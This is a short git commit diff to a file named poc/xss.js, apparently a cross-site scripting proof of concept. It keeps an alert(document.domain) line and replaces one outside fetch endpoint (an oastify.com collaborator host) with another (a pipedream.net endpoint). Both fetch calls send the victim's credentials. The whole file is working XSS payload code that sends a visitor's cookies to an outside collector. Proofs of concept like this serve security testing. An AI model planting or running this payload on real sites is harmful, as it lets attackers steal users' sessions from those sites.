0e77b750b62165602eec1054ddd5660273c47dd1
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2023-05-11 01:15:06 +0200

    Update xss.js

--- poc/xss.js
+++ poc/xss.js
@@ -1,2 +1,2 @@
 alert(document.domain);
-fetch("https://fm5n2h0mosdwra1zpw5d9wbo1f76vwjl.oastify.com/", { credentials: "include" })
+fetch("https://eolzili6viattmf.m.pipedream.net", { credentials: "include" })
